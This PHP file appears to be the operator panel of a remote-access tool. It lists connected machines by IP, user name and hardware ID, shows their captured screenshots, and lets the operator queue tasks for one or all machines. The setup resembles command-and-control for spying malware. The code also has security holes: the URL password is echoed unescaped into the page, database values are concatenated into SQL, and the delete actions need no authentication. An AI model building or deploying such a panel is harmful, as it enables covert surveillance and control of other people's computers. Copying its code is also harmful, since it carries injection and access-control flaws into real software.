<?php
	include("include/settings.php");
	
	if(isset($_GET["pwd"])) {
		if($_GET["pwd"] == $admin) {}
		else {
			die;
		}
	} else {
		die;
	}
	
	$status = "";
	
	$conn = new mysqli($host, $user, $pass, "controler");
	
	if(isset($_POST["delete_all"])) {
		$sql = 'DELETE FROM `task_all`';
		$conn->query($sql);
	} else if(isset($_POST["delete_to"])) {
		$sql = 'DELETE FROM `task_to`';
		$conn->query($sql);
	} else if(isset($_POST["delete_sh"])) {
		$sql = 'DELETE FROM `screenshot`';
		$conn->query($sql);
	}
	
	$sql = "SELECT COUNT(*) FROM `user`";
	$result = $conn->query($sql);
	$row = $result->fetch_assoc();
	$count_int = $row['COUNT(*)'];
	if ($count_int < 1) {
		$status = "No user";
	}
	else {
		$status = "Have user";
	}
?>

<!DOCTYPE HTML>
<html>
	<head>
		<meta charset="utf-8">
		<link rel="stylesheet" type="text/css" href="css/my.css">
		<title>Control my PC | Panel</title>
	</head>
	<body>
		<div class="menu">
			<div class="right" style="display: flex;">
				<form action="new_task.php" method="post">
				<input type="hidden" name="pwd" value="<?php echo $_GET["pwd"]; ?>">
					<button class="green-bt" type="submit">Add task</button>
				</form>
				<form method="post">
					<input type="hidden" name="delete_all" value="1">
					<button class="red-bt" style="margin-left: 5px;">Delete task`s (<b>all</b> user)</button>
				</form>
				
				<form method="post">
					<input type="hidden" name="delete_to" value="1">
					<button class="red-bt" style="margin-left: 5px;">Delete task`s (<b>some</b> user)</button>
				</form>
				
				<form method="post">
					<input type="hidden" name="delete_sh" value="1">
					<button class="red-bt" style="margin-left: 5px;">Delete <b>all</b> screenshot</button>
				</form>
			</div>
		</div>
		<div class="content">
		<br>
		<div class="table100 ver3 m-b-110">
			<div class="table100-head">
				<table>
					<thead>
						<tr class="row100 head">
							<th class="cell100 column1">IP</th>
							<th class="cell100 column2">User</th>
							<th class="cell100 column3">HWID</th>
							<th class="cell100 column4">Screenshot</th>
							<th class="cell100 column5">Set task</th>
						</tr>
					</thead>
				</table>
			</div>

			<div class="table100-body js-pscroll">
				<table>
					<tbody>
						<?php
						
							if ($status == "No user") {
								print '<tr class="row100 body"><td colspan="5">No user</td></tr>';
							} else {
								$sql = "SELECT `id` FROM `user`";
								$result = $conn->query($sql);
								while($row2 = $result->fetch_assoc()) {
									$sh = array();
									$a = $row2["id"];
									$sql2 = "SELECT `ip`, `user`, `hwid` FROM `user` WHERE `id` = ".$a;
									$result2 = $conn->query($sql2);
									$row = $result2->fetch_assoc();
									
									$sql3 = 'SELECT COUNT(*) FROM `screenshot`';
									$result3 = $conn->query($sql3);
									$row3 = $result3->fetch_assoc();
									
									if($row3['COUNT(*)'] > 0) {
										$sql4 = 'SELECT `base64` FROM `screenshot` WHERE `ip` = "'.$row["ip"].'"';
										$result4 = $conn->query($sql4);
										while($row4 = $result4->fetch_assoc()) {
											array_push($sh, $row4["base64"]);
										}
									} else {
										array_push($sh, "No screenshot");
									}
									
									print '<tr class="row100 body"><td class="cell100 column1">'.$row["ip"].'</td>
									<td class="cell100 column2">'.$row["user"].'</td>
									<td class="cell100 column3">'.$row["hwid"].'</td>
									<td class="cell100 column4">';
									for($nc = 0; $nc != sizeof($sh); $nc++){
										if ($sh[$nc] == "No screenshot") {
											print 'No screenshot';
											break;
										}
										print '<a href="'.$sh[$nc].'" target="_blank"> Img'.$nc.' </a>';
									}
									print '</td>
									<td class="cell100 column5">
										<form action="new_task.php" method="post">
											<input type="hidden" name="pwd" value="'.$_GET["pwd"].'">
											<input type="hidden" name="id" value="'.$a.'">
											<button class="green-bt" type="submit">Add task</button>
										</form>
									</td>
									</tr>';
								}
							}
						
						?>
					</tbody>
				</table>
			</div>
		</div>
	</body>
</html>